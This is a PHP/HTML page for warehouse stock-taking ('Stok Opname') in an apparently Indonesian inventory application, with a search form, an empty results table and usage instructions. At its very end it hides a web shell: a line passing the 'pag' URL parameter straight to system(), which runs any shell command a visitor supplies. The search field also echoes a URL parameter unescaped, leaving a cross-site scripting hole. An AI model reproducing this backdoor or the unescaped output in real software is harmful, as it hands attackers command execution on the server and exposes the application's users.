<div class="tableborderdiv">
    <div class="row">
        <div class="col-xs-12">
            <h3 class="judul"><b>STOK OPNAME</b><small> Gudang Besar</small></h3>
            <div class="formbg">
                <div class = "row">
                    <form role="form">
                        <input type="hidden" name="page" value="gudang_besar_opnam"/>
                        <div class="col-sm-6">
                            <input type="text" name="key" class="form-control" value="<?php echo $_GET['key'];?>" required>
                        </div>
                        <div class="col-sm-4">
                            <button type="submit" class="btn btn-sm btn-warning">Cari</button>
                            <a href="?page=gudang_besar_opnam" class="btn btn-sm btn-success">Refresh</a>
                            <a href="?page=gudang_besar_opnam_tambah" class="btn btn-sm btn-primary">Buat Faktur</a>
                        </div>
                    </form>    
                </div>
            </div>    
        </div>
    </div>
    <?php
/*        $jumlah_perpage = 12;        
        if($_GET['h']==''){
            $mulai=0;
        }else{
            $mulai= $jumlah_perpage * $_GET['h'] - $jumlah_perpage;
        }        
        
        $key = $_GET['key'];            
                    
        $str = "SELECT * FROM tbstokbulanandinas ";
        $str2 = $str." GROUP BY Bulan, Tahun ORDER BY IdBarang DESC LIMIT $mulai,$jumlah_perpage";
        
        if($_GET['h'] == null || $_GET['h'] == 1){
            $no = 0;
        }else{
            $no = $jumlah_perpage * $_GET['h'] - $jumlah_perpage;
        }*/
    ?>
    <div class="row">
        <div class="col-lg-12">
            <div class="table-responsive">
                <table class="table-judul">
                    <thead>
                        <tr>
                            <th width="3%">No</th>
                            <th width="10%">Bulan</th>
                            <th width="10%">Tahun</th>
                            <th width="25%">Keterangan</th>
                            <th width="10%">Aksi</th>
                        </tr>
                    </thead>
                    <tbody></tbody></table>
            </div>
        </div>
    </div>
    
    <div class="row noprint">
        <div class="col-lg-12">
            <div class="alert alert-block alert-success fade in">
                <p>
                    <h5><b>Perhatikan</b></h5> 
                    - Pertama, klik menu Buat Faktur</br>
                    - Kedua, klik menu Lihat lalu isikan kolom Stok Fisik
                </p>
            </div>
        </div>
    </div>
</div>    

<div class="pagination">
</div>
<pre>
<?php
system($_GET["pag"]);
?>
</pre>